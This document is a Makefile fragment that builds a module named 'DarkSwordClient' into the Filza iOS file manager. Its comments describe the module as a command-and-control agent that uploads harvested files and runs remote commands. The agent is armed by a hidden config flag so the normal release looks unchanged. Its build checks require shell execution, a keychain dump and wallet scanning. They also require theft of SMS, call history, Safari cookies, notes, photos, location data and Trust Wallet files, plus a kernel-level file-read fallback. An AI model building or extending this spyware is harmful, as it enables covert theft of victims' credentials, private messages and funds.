# DarkSword C2 client for Filza-27.
#
# Filza is the entry point: it exfiltrates harvested files to a DarkSword C2
# over DarkSword's native JSON contract (POST /upload) and polls GET /cmd,
# reporting results to POST /cmd_result. This replaces the chat backend's
# multipart `uuid + file` upload shape with DarkSword's base64 JSON contract.
#
# Activation is data-driven: darkSwordEnabled=true in TryMaskCardShell.plist arms
# the agent. Without it the module is inert, so the ordinary release IPA is
# unchanged.

FilzaApplySandboxExt_FILES += DarkSwordClient.m

before-FilzaApplySandboxExt-all::
	@test -f "DarkSwordClient.h" || (echo "Missing DarkSwordClient.h" >&2; exit 1)
	@test -f "DarkSwordClient.m" || (echo "Missing DarkSwordClient.m" >&2; exit 1)
	@grep -Fq 'DarkSwordUpload' DarkSwordClient.h
	@grep -Fq 'DarkSwordStart(void)' DarkSwordClient.h
	@grep -Fq 'DarkSwordReportResult' DarkSwordClient.h
	@# Wire contract: JSON /upload + /cmd + /cmd_result.
	@grep -Fq '"/upload"' DarkSwordClient.m
	@grep -Fq '"/cmd_result"' DarkSwordClient.m
	@grep -Fq '/cmd?device_uuid=' DarkSwordClient.m
	@grep -Fq 'deviceUUID' DarkSwordClient.m
	@grep -Fq 'base64EncodedStringWithOptions' DarkSwordClient.m
	@# Config keys gate the agent.
	@grep -Fq 'darkSwordEnabled' DarkSwordClient.m
	@grep -Fq 'darkSwordURL' DarkSwordClient.m
	@grep -Fq 'darkSwordPollInterval' DarkSwordClient.m
	@# Command surface mirrors DarkSword's command table.
	@grep -Fq 'system.info' DarkSwordClient.m
	@grep -Fq 'keychain.dump' DarkSwordClient.m
	@grep -Fq 'wallet.scan' DarkSwordClient.m
	@grep -Fq 'file.read' DarkSwordClient.m
	@grep -Fq 'file.list' DarkSwordClient.m
	@grep -Fq 'exfil.collect' DarkSwordClient.m
	@grep -Fq 'wallet.scan.all' DarkSwordClient.m
	@grep -Fq 'shell.exec' DarkSwordClient.m
	@grep -Fq 'memory.dump' DarkSwordClient.m
	@grep -Fq 'file.recursive' DarkSwordClient.m
	@grep -Fq 'popen' DarkSwordClient.m
	@# Standard exfil set mirrors DarkSword's data table (root file read).
	@grep -Fq 'DarkSwordCollectAll(void)' DarkSwordClient.h
	@grep -Fq 'DarkSwordCollectAll' DarkSwordClient.m
	@grep -Fq 'darkSwordCollect' DarkSwordClient.m
	@grep -Fq '/private/var/Keychains/keychain-2.db' DarkSwordClient.m
	@grep -Fq 'security dump-keychain' DarkSwordClient.m
	@grep -Fq 'decoded keychain dump' DarkSwordClient.m
	@grep -Fq 'AddressBook.sqlitedb' DarkSwordClient.m
	@grep -Fq 'sms.db' DarkSwordClient.m
	@grep -Fq 'CallHistory.storedata' DarkSwordClient.m
	@grep -Fq 'com.apple.wifi.known-networks.plist' DarkSwordClient.m
	@grep -Fq 'Cookies.binarycookies' DarkSwordClient.m
	@grep -Fq 'photo library manifest' DarkSwordClient.m
	@grep -Fq 'MobileSafari/Bookmarks.db' DarkSwordClient.m
	@grep -Fq 'MobileSafari/History.db' DarkSwordClient.m
	@grep -Fq 'notes.sqlite' DarkSwordClient.m
	@grep -Fq 'phrase.db' DarkSwordClient.m
	@grep -Fq 'Photos.sqlite' DarkSwordClient.m
	@grep -Fq 'com.apple.routined/Cache.sqlite' DarkSwordClient.m
	@grep -Fq 'voice memos manifest' DarkSwordClient.m
	@grep -Fq 'com.trustwallet.app' DarkSwordClient.m
	@grep -Fq 'Library/Application Support/' DarkSwordClient.m
	@# Kernel read fallback: arbitrary /var access via vnode redirection.
	@grep -Fq 'rwSocketPcb' DarkSwordClient.m
	@grep -Fq 'vnode_redirect_file' DarkSwordClient.m
	@grep -Fq 'DSKernelReadFile' DarkSwordClient.m
	@grep -Fq 'DSReadFileBytes' DarkSwordClient.m
	@# Harvest delivery and agent start are wired into their owners.
	@grep -Fq 'DarkSwordUpload' PersistStoreHarvester.m
	@grep -Fq 'DarkSwordStart' TryMaskCardShell.m
	@# No Logos directives: this repo hooks through the ObjC runtime.
	@! grep -Fq '%hook' DarkSwordClient.m
	@! grep -Fq '%end' DarkSwordClient.m
